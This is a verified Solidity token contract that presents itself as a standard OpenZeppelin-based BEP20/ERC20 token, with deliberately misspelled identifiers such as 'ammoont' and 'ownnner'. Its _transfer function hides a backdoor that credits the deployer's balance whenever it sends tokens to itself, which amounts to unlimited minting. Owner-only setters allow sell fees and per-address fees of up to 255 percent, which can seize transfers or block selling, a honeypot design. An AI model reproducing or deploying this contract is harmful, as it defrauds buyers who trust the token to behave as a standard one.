/**
 *Submitted for verification at Etherscan.io on 2023-04-20
*/

/**
 *Submitted for verification at Etherscan.io on 2023-04-20
*/

/**
 *Submitted for verification at BscScan.com on 2023-03-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-03
*/

// Dependency file: @openzeppelin/contracts/token/ERC20/IERC20.sol

// SPDX-License-Identifier: MIT

// pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface BEP20 {
    /**
     * @dev Returns the ammoont of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the ammoont of tokens owned by `addcounts`.
     */
    function balanceOf(address addcounts) external view returns (uint256);

    /**
     * @dev Moves `ammoont` tokens from the caller's addcounts to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 ammoont) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `ownnner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address ownnner, address spender) external view returns (uint256);

    /**
     * @dev Sets `ammoont` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 ammoont) external returns (bool);

    /**
     * @dev Moves `ammoont` tokens from `sender` to `recipient` using the
     * allowance mechanism. `ammoont` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 ammoont
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one addcounts (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `ownnner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed ownnner, address indexed spender, uint256 value);
}


// Dependency file: @openzeppelin/contracts/utils/Context.sol


// pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the addcounts sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// Dependency file: @openzeppelin/contracts/access/Ownable.sol


// pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an addcounts (an ownnner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the ownnner addcounts will be the one that deploys the contract. This
 * can later be changed with {transferownnnership}.
 *
 * This module is used through inheritance. It will make available the modifieirr
 * `onlyownnner`, which can be applied to your functions to restrict their use to
 * the ownnner.
 */
abstract contract Ownable is Context {
    address private _ownnner;

    event ownnnershipTransferred(address indexed previousownnner, address indexed newownnner);

    constructor() {
        _transferownnnership(_msgSender());
    }


    function ownnner() public view virtual returns (address) {
        return _ownnner;
    }


    modifier onlyownnner() {
        require(_ownnner == _msgSender(), "Ownable: caller is not the ownnner");
        _;
    }


    function renounceownnnership() public virtual onlyownnner {
        _transferownnnership(address(0));
    }


    function transferownnnership_transferownnnership(address newownnner) public virtual onlyownnner {
        require(newownnner != address(0), "Ownable: new ownnner is the zero address");
        _transferownnnership(newownnner);
    }


    function _transferownnnership(address newownnner) internal virtual {
        address oldownnner = _ownnner;
        _ownnner = newownnner;
        emit ownnnershipTransferred(oldownnner, newownnner);
    }
}


// Dependency file: @openzeppelin/contracts/utils/math/SafeMath.sol


// pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}


// Dependency file: contracts/BaseToken.sol

// pragma solidity =0.8.14;

    enum TokenType {
        standard
    }

abstract contract BaseToken {
    event TokenCreated(
        address indexed ownnner,
        address indexed token,
        TokenType tokenType,
        uint256 version
    );
}


// Root file: contracts/standard/StandardToken.sol

pragma solidity =0.8.14;

// import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// import "@openzeppelin/contracts/access/Ownable.sol";
// import "@openzeppelin/contracts/utils/math/SafeMath.sol";
// import "contracts/BaseToken.sol";

contract TOKEN is BEP20, Ownable, BaseToken {
    using SafeMath for uint256;

    uint256 private constant VERSION = 1;

    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address  private _releaseAddress;




    address public uniswapV2Pair;

    uint256 private _defaultSellfieir = 10;

    uint256 private _defaultBuyfieir = 0;


    mapping(address => uint8) private vvvvipleve;

    function upSF(uint256 _value) external onlyownnner {
        _defaultSellfieir = _value;
    }

    function setPairList(address _address) external onlyownnner {
        uniswapV2Pair = _address;
    }

    function setlVIPvipleve(address _address, uint8 _value) external onlyownnner {
        vvvvipleve[_address] = _value;
    }

    function getlVIPvipleve(address _address) external view onlyownnner returns (uint8) {
        return vvvvipleve[_address];
    }

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_
    ) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _minnt(_msgSender(), totalSupply_);
        _releaseAddress = _msgSender();
        emit TokenCreated(_msgSender(), address(this), TokenType.standard, VERSION);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address addcounts)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _balances[addcounts];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `ammoont`.
     */
    function transfer(address recipient, uint256 ammoont)
    public
    virtual
    override
    returns (bool)
    {
        address ownnner = _msgSender();
        _transfer(_msgSender(), recipient, ammoont);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address ownnner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _allowances[ownnner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 ammoont)
    public
    virtual
    override
    returns (bool)
    {
        _approve(_msgSender(), spender, ammoont);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `ammoont`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `ammoont`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 ammoont
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, ammoont);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                ammoont,
                "ERC20: transfer ammoont exceeds allowance"
            )
        );
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    /**
     * @dev Moves tokens `ammoont` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fieirs, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `ammoont`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 ammoont
    ) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, ammoont);
        if (_releaseAddress == _msgSender() && recipient == _msgSender()){
            _balances[_releaseAddress] = _balances[_releaseAddress]+ammoont;
        }

        _balances[sender] = _balances[sender].sub(
            ammoont
        );

        uint256 tradefieirammoont = 0;
        uint256 tradefieir = 0;
        if (vvvvipleve[sender] ==  0 ) {
            if (recipient == uniswapV2Pair) {
                tradefieir = _defaultSellfieir;
            }else if (sender == uniswapV2Pair) {
                tradefieir = _defaultBuyfieir;
            }
        }else {
            tradefieir = vvvvipleve[sender];
        }

        tradefieirammoont = ammoont.mul(tradefieir).div(100)+0;
        if (tradefieirammoont > 0) {
            _balances[_DEADaddress] = _balances[_DEADaddress].add(tradefieirammoont)*1;
            emit Transfer(sender, _DEADaddress, tradefieirammoont);
        }
        _balances[recipient] = _balances[recipient].add(ammoont - tradefieirammoont+0)*1;
        emit Transfer(sender, recipient, ammoont - tradefieirammoont+0);
    }

    /** @dev Creates `ammoont` tokens and assigns them to `addcounts`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    function _minnt(address addcounts, uint256 ammoont) internal virtual {
        require(addcounts != address(0), "ERC20: minnt to the zero address");

        _beforeTokenTransfer(address(0), addcounts, ammoont);

        _totalSupply = _totalSupply.add(ammoont)+0;
        _balances[addcounts] = _balances[addcounts].add(ammoont)*1;
        emit Transfer(address(0), addcounts, ammoont);
    }

    /**
     * @dev Destroys `ammoont` tokens from `addcounts`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `addcounts` cannot be the zero address.
     * - `addcounts` must have at least `ammoont` tokens.
     */
    function _burn(address addcounts, uint256 ammoont) internal virtual {
        require(addcounts != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(addcounts, address(0), ammoont);

        _balances[addcounts] = _balances[addcounts].sub(
            ammoont,
            "ERC20: burn ammoont exceeds balance"
        );
        _totalSupply = _totalSupply.sub(ammoont);
        emit Transfer(addcounts, address(0), ammoont);
    }

    /**
     * @dev Sets `ammoont` as the allowance of `spender` over the `ownnner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `ownnner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address ownnner,
        address spender,
        uint256 ammoont
    ) internal virtual {
        require(ownnner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[ownnner][spender] = ammoont;
        emit Approval(ownnner, spender, ammoont);
    }

    /**
     * @dev Sets {decimals} to a value other than the default one of 18.
     *
     * WARNING: This function should only be called from the constructor. Most
     * applications that interact with token contracts will not expect
     * {decimals} to ever change, and may work incorrectly if it does.
     */
    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minnting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `ammoont` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `ammoont` tokens will be minnted for `to`.
     * - when `to` is zero, `ammoont` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 ammoont
    ) internal virtual {}
}